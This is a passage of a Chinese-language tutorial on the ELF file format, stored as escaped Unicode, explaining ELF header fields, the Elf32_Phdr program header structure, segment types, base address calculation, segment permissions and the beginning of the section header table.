\u4e2d\u76f8\u5e94\u4ee3\u7801\u7684\u865a\u62df\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u76f8\u5173\u7684\u5165\u53e3\u9879\uff0c\u5219\u8fd9\u4e00\u9879\u4e3a0\u3002\n\n\ne_phoff\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\n\u7a0b\u5e8f\u5934\u90e8\u8868\n\u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08\nProgram Header table OFFset\n\uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u4e3a0\u3002\n\n\ne_shoff\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\n\u8282\u5934\u8868\n\u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08 \nSection Header table OFFset\n \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u4e3a0\u3002\n\n\ne_flags\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\u6587\u4ef6\u4e2d\u4e0e\u7279\u5b9a\u5904\u7406\u5668\u76f8\u5173\u7684\u6807\u5fd7\uff0c\u8fd9\u4e9b\u6807\u5fd7\u547d\u540d\u683c\u5f0f\u4e3a\nEF_machine_flag\n\u3002\n\n\ne_ehsize\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa ELF \u6587\u4ef6\u5934\u90e8\u7684\u5b57\u8282\u957f\u5ea6\uff08ELF Header Size\uff09\u3002\n\n\ne_phentsize\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u4e2d\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u957f\u5ea6\uff08\nProgram Header ENTry SIZE\n\uff09\u3002\u6bcf\u4e2a\u8868\u9879\u7684\u5927\u5c0f\u76f8\u540c\u3002\n\n\ne_phnum\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u9879\u6570\uff08 \nProgram Header entry NUMber\n \uff09\u3002\u56e0\u6b64\uff0c\ne_phnum\n \u4e0e \ne_phentsize\n \u7684\u4e58\u79ef\u5373\u4e3a\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002\n\n\ne_shentsize\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u7684\u5b57\u8282\u957f\u5ea6\uff08\nSection Header ENTry SIZE\n\uff09\u3002\u4e00\u4e2a\u8282\u5934\u662f\u8282\u5934\u8868\u4e2d\u7684\u4e00\u9879\uff1b\u8282\u5934\u8868\u4e2d\u6240\u6709\u9879\u5360\u636e\u7684\u7a7a\u95f4\u5927\u5c0f\u76f8\u540c\u3002\n\n\ne_shnum\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u7684\u9879\u6570\uff08\nSection Header NUMber\n\uff09\u3002\u56e0\u6b64\uff0c \ne_shnum\n \u4e0e \ne_shentsize\n \u7684\u4e58\u79ef\u5373\u4e3a\u8282\u5934\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002\n\n\ne_shstrndx\n\n\n\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u4e0e\u8282\u540d\u5b57\u7b26\u4e32\u8868\u76f8\u5173\u7684\u8868\u9879\u7684\u7d22\u5f15\u503c\uff08\nSection Header table InDeX related with section  name STRing table\n\uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u540d\u5b57\u7b26\u4e32\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a\nSHN_UNDEF\n\u3002\u5173\u4e8e\u7ec6\u8282\u7684\u4ecb\u7ecd\uff0c\u8bf7\u53c2\u8003\u540e\u9762\u7684\u201c\u8282\u201d\u548c\u201c\u5b57\u7b26\u4e32\u8868\u201d\u90e8\u5206\u3002\n\n\nProgram Header Table\n\n\n\u6982\u8ff0\n\n\nProgram Header Table \u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u662f \nElf32_Phdr\n\uff0c\u63cf\u8ff0\u4e86\u4e00\u4e2a\u6bb5\u6216\u8005\u5176\u5b83\u7cfb\u7edf\u5728\u51c6\u5907\u7a0b\u5e8f\u6267\u884c\u65f6\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cELF \u5934\u4e2d\u7684 \ne_phentsize\n \u548c \ne_phnum\n \u6307\u5b9a\u4e86\u8be5\u6570\u7ec4\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4ee5\u53ca\u5143\u7d20\u4e2a\u6570\u3002\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u6bb5\u5305\u542b\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u8282\u3002\n\u7a0b\u5e8f\u7684\u5934\u90e8\u53ea\u6709\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u610f\u4e49\u3002\n\n\n\u53ef\u4ee5\u8bf4\uff0cProgram Header Table \u5c31\u662f\u4e13\u95e8\u4e3a ELF \u6587\u4ef6\u8fd0\u884c\u65f6\u4e2d\u7684\u6bb5\u6240\u51c6\u5907\u7684\u3002\n\n\nElf32_Phdr\n \u7684\u6570\u636e\u7ed3\u6784\u5982\u4e0b\n\n\ntypedef\n \nstruct\n \n{\n\n    \nELF32_Word\n  \np_type\n;\n\n    \nELF32_Off\n   \np_offset\n;\n\n    \nELF32_Addr\n  \np_vaddr\n;\n\n    \nELF32_Addr\n  \np_paddr\n;\n\n    \nELF32_Word\n  \np_filesz\n;\n\n    \nELF32_Word\n  \np_memsz\n;\n\n    \nELF32_Word\n  \np_flags\n;\n\n    \nELF32_Word\n  \np_align\n;\n\n\n}\n \nElf32_Phdr\n;\n\n\n\n\n\n\u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u5b57\u6bb5\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\np_type\n\n\n\u8be5\u5b57\u6bb5\u4e3a\u6bb5\u7684\u7c7b\u578b\uff0c\u6216\u8005\u8868\u660e\u4e86\u8be5\u7ed3\u6784\u7684\u76f8\u5173\u4fe1\u606f\u3002\n\n\n\n\n\n\np_offset\n\n\n\u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u59cb\u5230\u8be5\u6bb5\u5f00\u5934\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u3002\n\n\n\n\n\n\np_vaddr\n\n\n\u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u8be5\u6bb5\u7b2c\u4e00\u4e2a\u5b57\u8282\u5728\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u3002\n\n\n\n\n\n\np_paddr\n\n\n\u8be5\u5b57\u6bb5\u4ec5\u7528\u4e8e\u7269\u7406\u5730\u5740\u5bfb\u5740\u76f8\u5173\u7684\u7cfb\u7edf\u4e2d\uff0c \u7531\u4e8e\u201dSystem V\u201d\u5ffd\u7565\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u7269\u7406\u5bfb\u5740\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8be5\u9879\u5185\u5bb9\u5e76\u672a\u88ab\u9650\u5b9a\u3002\n\n\n\n\n\n\np_filesz\n\n\n\u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u6587\u4ef6\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002\n\n\n\n\n\n\np_memsz\n\n\n\u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u5185\u5b58\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002\n\n\n\n\n\n\np_flags\n\n\n\u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4e0e\u6bb5\u76f8\u5173\u7684\u6807\u8bb0\u3002\n\n\n\n\n\n\np_align\n\n\n\u53ef\u52a0\u8f7d\u7684\u7a0b\u5e8f\u7684\u6bb5\u7684 p_vaddr \u4ee5\u53ca p_offset \u7684\u5927\u5c0f\u5fc5\u987b\u662f page \u7684\u6574\u6570\u500d\u3002\u8be5\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u5728\u6587\u4ef6\u4ee5\u53ca\u5185\u5b58\u4e2d\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002\u5982\u679c\u8be5\u503c\u4e3a 0 \u6216 1 \u7684\u8bdd\uff0c\u8868\u793a\u4e0d\u9700\u8981\u5bf9\u9f50\u3002\u9664\u6b64\u4e4b\u5916\uff0cp_align \u5e94\u8be5\u662f 2 \u7684\u6574\u6570\u6307\u6570\u6b21\u65b9\uff0c\u5e76\u4e14 p_vaddr \u4e0e p_offset \u5728\u6a21 p_align \u7684\u610f\u4e49\u4e0b\uff0c\u5e94\u8be5\u76f8\u7b49\u3002\n\n\n\n\n\n\n\n\n\u6bb5\u7c7b\u578b\n\n\n\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u6bb5\u7c7b\u578b\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u540d\u5b57\n\n\n\u53d6\u503c\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nPT_NULL\n\n\n0\n\n\n\u8868\u660e\u6bb5\u672a\u4f7f\u7528\uff0c\u5176\u7ed3\u6784\u4e2d\u5176\u4ed6\u6210\u5458\u90fd\u662f\u672a\u5b9a\u4e49\u7684\u3002\n\n\n\n\n\n\nPT_LOAD\n\n\n1\n\n\n\u6b64\u7c7b\u578b\u6bb5\u4e3a\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u5927\u5c0f\u7531 p_filesz \u548c p_memsz  \u63cf\u8ff0\u3002\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u88ab\u6620\u5c04\u5230\u76f8\u5e94\u5185\u5b58\u6bb5\u5f00\u59cb\u5904\u3002\u5982\u679c p_memsz  \u5927\u4e8e  p_filesz\uff0c\u201c\u5269\u4f59\u201d\u7684\u5b57\u8282\u90fd\u8981\u88ab\u7f6e\u4e3a0\u3002p_filesz \u4e0d\u80fd\u5927\u4e8e p_memsz\u3002\u53ef\u52a0\u8f7d\u7684\u6bb5\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6309\u7167 p_vaddr \u7684\u5347\u5e8f\u6392\u5217\u3002\n\n\n\n\n\n\nPT_DYNAMIC\n\n\n2\n\n\n\u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002\n\n\n\n\n\n\nPT_INTERP\n\n\n3\n\n\n\u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u4e86\u4e00\u4e2a\u4ee5 NULL  \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u548c\u957f\u5ea6\uff0c\u8be5\u5b57\u7b26\u4e32\u5c06\u88ab\u5f53\u4f5c\u89e3\u91ca\u5668\u8c03\u7528\u3002\u8fd9\u79cd\u6bb5\u7c7b\u578b\u4ec5\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u6709\u610f\u4e49\uff08\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff09\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u6bb5\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002\u800c\u4e14\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u7684\u524d\u9762\u3002\n\n\n\n\n\n\nPT_NOTE\n\n\n4\n\n\n\u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\u7684\u4f4d\u7f6e\u548c\u5927\u5c0f\u3002\n\n\n\n\n\n\nPT_SHLIB\n\n\n5\n\n\n\u8be5\u6bb5\u7c7b\u578b\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u8bed\u4e49\u672a\u6307\u5b9a\u3002\u800c\u4e14\uff0c\u5305\u542b\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u7684\u7a0b\u5e8f\u4e0d\u7b26\u5408ABI\u6807\u51c6\u3002\n\n\n\n\n\n\nPT_PHDR\n\n\n6\n\n\n\u8be5\u6bb5\u7c7b\u578b\u7684\u6570\u7ec4\u5143\u7d20\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u7ed9\u51fa\u4e86\u7a0b\u5e8f\u5934\u90e8\u8868\u81ea\u8eab\u7684\u5927\u5c0f\u548c\u4f4d\u7f6e\uff0c\u65e2\u5305\u62ec\u5728\u6587\u4ef6\u4e2d\u4e5f\u5305\u62ec\u5728\u5185\u5b58\u4e2d\u7684\u4fe1\u606f\u3002\u6b64\u7c7b\u578b\u7684\u6bb5\u5728\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002\n\u6b64\u5916\uff0c\u53ea\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\u662f\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u5b83\u624d\u4f1a\u51fa\u73b0\n\u3002\u5982\u679c\u6b64\u7c7b\u578b\u6bb5\u5b58\u5728\uff0c\u5219\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u76ee\u7684\u524d\u9762\u3002\n\n\n\n\n\n\nPT_LOPROC~PT_HIPROC\n\n\n0x70000000  ~0x7fffffff\n\n\n\u6b64\u8303\u56f4\u7684\u7c7b\u578b\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u3002\n\n\n\n\n\n\n\n\n\u57fa\u5730\u5740-Base Address\n\n\n\u7a0b\u5e8f\u5934\u90e8\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u5e76\u4e0d\u662f\u7a0b\u5e8f\u5185\u5b58\u955c\u50cf\u4e2d\u5b9e\u9645\u7684\u865a\u62df\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f\u90fd\u4f1a\u5305\u542b\u7edd\u5bf9\u5730\u5740\u7684\u4ee3\u7801\u3002\u4e3a\u4e86\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u6bb5\u5fc5\u987b\u5728\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u3002\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u88ab\u591a\u4e2a\u8fdb\u7a0b\u52a0\u8f7d\uff0c\u540c\u65f6\u4fdd\u6301\u7a0b\u5e8f\u6267\u884c\u7684\u6b63\u786e\u6027\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u7136\u4fdd\u7559\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\uff0c\n\u56e0\u4e3a\u5730\u5740\u65e0\u5173\u4ee3\u7801\u4f7f\u7528\u6bb5\u4e4b\u95f4\u7684\u76f8\u5bf9\u5730\u5740\u6765\u8fdb\u884c\u5bfb\u5740\uff0c\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u5fc5\u987b\u4e0e\u6587\u4ef6\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u76f8\u5339\u914d\n\u3002\u5185\u5b58\u4e2d\u4efb\u4f55\u6bb5\u7684\u865a\u62df\u5730\u5740\u4e0e\u6587\u4ef6\u4e2d\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u503c\u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u5bf9\u8c61\u6765\u8bf4\u662f\u4e00\u4e2a\u5355\u4e00\u5e38\u91cf\u503c\u3002\u8fd9\u4e2a\u5dee\u503c\u5c31\u662f\u57fa\u5730\u5740\uff0c\u57fa\u5730\u5740\u7684\u4e00\u4e2a\u7528\u9014\u5c31\u662f\u5728\u52a8\u6001\u94fe\u63a5\u671f\u95f4\u91cd\u65b0\u5b9a\u4f4d\u7a0b\u5e8f\u3002\n\n\n\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u5730\u5740\u662f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u7531\u4ee5\u4e0b\u4e09\u4e2a\u6570\u503c\u8ba1\u7b97\u7684\n\n\n\n\n\u865a\u62df\u5185\u5b58\u52a0\u8f7d\u5730\u5740\n\n\n\u6700\u5927\u9875\u9762\u5927\u5c0f\n\n\n\u7a0b\u5e8f\u53ef\u52a0\u8f7d\u6bb5\u7684\u6700\u4f4e\u865a\u62df\u5730\u5740\n\n\n\n\n\u8981\u8ba1\u7b97\u57fa\u5730\u5740\uff0c\u9996\u5148\u8981\u786e\u5b9a\u53ef\u52a0\u8f7d\u6bb5\u4e2d p_vaddr \u6700\u5c0f\u7684\u5185\u5b58\u865a\u62df\u5730\u5740\uff0c\u4e4b\u540e\u628a\u8be5\u5185\u5b58\u865a\u62df\u5730\u5740\u7f29\u5c0f\u4e3a\u4e0e\u4e4b\u6700\u8fd1\u7684\u6700\u5927\u9875\u9762\u7684\u6574\u6570\u500d\u5373\u662f\u57fa\u5730\u5740\u3002\u6839\u636e\u8981\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u5185\u5b58\u5730\u5740\u53ef\u80fd\u4e0e p_vaddr \u76f8\u540c\u4e5f\u53ef\u80fd\u4e0d\u540c\u3002\n\n\n\u6bb5\u6743\u9650-p_flags\n\n\n\u88ab\u7cfb\u7edf\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u81f3\u5c11\u6709\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\u3002\u5f53\u7cfb\u7edf\u4e3a\u53ef\u52a0\u8f7d\u7684\u6bb5\u521b\u5efa\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u5b83\u4f1a\u6309\u7167 p_flags \u5c06\u6bb5\u8bbe\u7f6e\u4e3a\u5bf9\u5e94\u7684\u6743\u9650\u3002\u53ef\u80fd\u7684\u6bb5\u6743\u9650\u4f4d\u6709\n\n\n\n\n\u5176\u4e2d\uff0c\u6240\u6709\u5728 PF_MASKPROC \u4e2d\u7684\u6bd4\u7279\u4f4d\u90fd\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u4e0e\u5904\u7406\u5668\u76f8\u5173\u7684\u8bed\u4e49\u4fe1\u606f\u3002\n\n\n\u5982\u679c\u4e00\u4e2a\u6743\u9650\u4f4d\u88ab\u8bbe\u7f6e\u4e3a 0\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u662f\u4e0d\u53ef\u8bbf\u95ee\u7684\u3002\u5b9e\u9645\u7684\u5185\u5b58\u6743\u9650\u53d6\u51b3\u4e8e\u76f8\u5e94\u7684\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u64cd\u4f5c\u65b9\u5f0f\u4e0d\u4e00\u6837\u3002\u5c3d\u7ba1\u6240\u6709\u7684\u6743\u9650\u7ec4\u5408\u90fd\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u7cfb\u7edf\u4e00\u822c\u4f1a\u6388\u4e88\u6bd4\u8bf7\u6c42\u66f4\u591a\u7684\u6743\u9650\u3002\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u9664\u975e\u660e\u786e\u8bf4\u660e\uff0c\u4e00\u4e2a\u6bb5\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u6240\u6709\u7684\u53ef\u80fd\u7ec4\u5408\u3002\n\n\n\n\n\u4f8b\u5982\uff0c\u4e00\u822c\u6765\u8bf4\uff0c.text \u6bb5\u4e00\u822c\u5177\u6709\u8bfb\u548c\u6267\u884c\u6743\u9650\uff0c\u4f46\u662f\u4e0d\u4f1a\u6709\u5199\u6743\u9650\u3002\u6570\u636e\u6bb5\u4e00\u822c\u5177\u6709\u5199\uff0c\u8bfb\uff0c\u4ee5\u53ca\u6267\u884c\u6743\u9650\u3002\n\n\n\u6bb5\u5185\u5bb9\n\n\n\u4e00\u4e2a\u6bb5\u53ef\u80fd\u5305\u62ec\u4e00\u5230\u591a\u4e2a\u8282\u533a\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u52a0\u8f7d\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u6211\u4eec\u4e5f\u5fc5\u987b\u9700\u8981\u5404\u79cd\u5404\u6837\u7684\u6570\u636e\u6765\u4f7f\u5f97\u7a0b\u5e8f\u53ef\u4ee5\u6267\u884c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7b49\u7b49\u3002\u4e0b\u9762\u4f1a\u7ed9\u51fa\u4e00\u822c\u60c5\u51b5\u4e0b\u7684\u6bb5\u7684\u5185\u5bb9\u3002\u5bf9\u4e8e\u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\uff0c\u5b83\u7684\u8282\u7684\u987a\u5e8f\u4ee5\u53ca\u6240\u5305\u542b\u7684\u8282\u7684\u4e2a\u6570\u6709\u6240\u4e0d\u540c\u3002\u6b64\u5916\uff0c\u4e0e\u5904\u7406\u76f8\u5173\u7684\u7ea6\u675f\u53ef\u80fd\u4f1a\u6539\u53d8\u5bf9\u5e94\u7684\u6bb5\u7684\u7ed3\u6784\u3002\n\n\n\u5982\u4e0b\u6240\u793a\uff0c\u4ee3\u7801\u6bb5\u53ea\u5305\u542b\u53ea\u8bfb\u7684\u6307\u4ee4\u4ee5\u53ca\u6570\u636e\u3002\u5f53\u7136\u8fd9\u4e2a\u4f8b\u5b50\u5e76\u6ca1\u6709\u7ed9\u51fa\u6240\u6709\u7684\u53ef\u80fd\u7684\u6bb5\u3002\n\n\n\n\n\u6570\u636e\u6bb5\u5305\u542b\u53ef\u5199\u7684\u6570\u636e\u4ee5\u53ca\u4ee5\u53ca\u6307\u4ee4\uff0c\u901a\u5e38\u6765\u8bf4\uff0c\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\n\n\n\n\n\u7a0b\u5e8f\u5934\u90e8\u7684 PT_DYNAMIC \u7c7b\u578b\u7684\u5143\u7d20\u6307\u5411\u6307\u5411 .dynamic \u8282\u3002\u5176\u4e2d\uff0cgot \u8868\u548c plt \u8868\u5305\u542b\u4e0e\u5730\u5740\u65e0\u5173\u7684\u4ee3\u7801\u76f8\u5173\u4fe1\u606f\u3002\u5c3d\u7ba1\u5728\u8fd9\u91cc\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0cplt \u8282\u51fa\u73b0\u5728\u4ee3\u7801\u6bb5\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u5904\u7406\u5668\u6765\u8bf4\uff0c\u53ef\u80fd\u4f1a\u6709\u6240\u53d8\u52a8\u3002\n\n\n.bss \u8282\u7684\u7c7b\u578b\u4e3a SHT_NOBITS\uff0c\u8fd9\u8868\u660e\u5b83\u5728 ELF \u6587\u4ef6\u4e2d\u4e0d\u5360\u7528\u7a7a\u95f4\uff0c\u4f46\u662f\u5b83\u5374\u5360\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7684\u7a7a\u95f4\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\u5728\u6bb5\u7684\u5c3e\u90e8\uff0c\u56e0\u6b64\uff0c\np_memsz\n \u624d\u4f1a\u6bd4 \np_filesz\n \u5927\u3002\n\n\n\u6ce8\u610f\uff1a\n\n\n\n\n\u4e0d\u540c\u7684\u6bb5\u6765\u8bf4\u53ef\u80fd\u4f1a\u6709\u6240\u91cd\u5408\uff0c\u5373\u4e0d\u540c\u7684\u6bb5\u5305\u542b\u76f8\u540c\u7684\u8282\u3002\n\n\n\n\nSection Header Table\n\n\n\u5176\u5b9e\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u662f\u5728 ELF \u6587\u4ef6\u7684\u5c3e\u90e8\uff08 \n\u4e3a\u4ec0\u4e48\u8981\u653e\u5728\u6587\u4ef6\u5c3e\u90e8\u5462\uff1f\uff1f\n \uff09\uff0c\u4f46\u662f\u4e3a\u4e86\u8bb2\u89e3\u65b9\u4fbf\uff0c\u8fd9\u91cc\u5c06\u8fd9\u4e2a\u8868\u653e\u5728\u8fd9\u91cc\u8fdb\u884c\u8bb2\u89e3\u3002\n\n\n\u8be5\u7ed3\u6784\u7528\u4e8e\u5b9a\u4f4d ELF \u6587\u4ef6\u4e2d\u7684\u6bcf\u4e2a\u8282\u533a\u7684\u5177\u4f53\u4f4d\u7f6e\u3002\n\n\n\u9996\u5148\uff0cELF\u5934\u4e2d\u7684 \ne_shoff\n \u9879\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u5934\u5230\u8282\u5934\u8868\u4f4d\u7f6e\u7684\u5b57\u8282\u504f\u79fb\u3002\ne_shnum\n \u544a\u8bc9\u4e86\u6211\u4eec\u8282\u5934\u8868\u5305\u542b\u7684\u9879\u6570\uff1b\ne_shentsize\n \u7ed9\u51fa\u4e86\u6bcf\u4e00\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\n\n\n\u5176\u6b21\uff0c\u8282\u5934\u8868\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6bcf\u4e2a\u6570\u7ec4\u7684\u5143\u7d20\u7684\u7c7b\u578b\u662f \nELF32_Shdr\n \uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u63cf\u8ff0\u4e86\u4e00\u4e2a\u8282\u533a\u7684\u6982\u8981\u5185\u5bb9\u3002\n\n\nELF32_Shdr\n\n\n\u6bcf\u4e2a\u8282\u533a\u5934\u90e8\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u6570\u636e\u7ed3\u6784\u8fdb\u884c\u63cf\u8ff0\uff1a\n\n\ntypedef\n \nstruct\n \n{\n\n    \nELF32_Word\n      \nsh_name\n;\n\n    \nELF32_Word\n      \nsh_type\n;\n\n    \nELF32_Word\n      \nsh_flags\n;\n\n    \nELF32_Addr\n      \nsh_addr\n;\n\n    \nELF32_Off\n       \nsh_offset\n;\n\n    \nELF32_Word\n      \nsh_size\n;\n\n    \nELF32_Word\n      \nsh_link\n;\n\n    \nELF32_Word\n      \nsh_info\n;\n\n    \nELF32_Word\n      \nsh_addralign\n;\n\n    \nELF32_Word\n      \nsh_entsize\n;\n\n\n}\n \nElf32_Shdr\n;\n\n\n\n\n\n\u6bcf\u4e2a\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u6210\u5458\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nsh_name\n\n\n\u8282\u540d\u79f0\uff0c\u662f\u8282\u533a\u5934\u5b57\u7b26\u4e32\u8868\u8282\u533a\u4e2d\uff08Section Header String Table Section\uff09\u7684\u7d22\u5f15\uff0c\u56e0\u6b64\u8be5\u5b57\u6bb5\u5b9e\u9645\u662f\u4e00\u4e2a\u6570\u503c\u3002\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u5177\u4f53\u5185\u5bb9\u662f\u4ee5 NULL 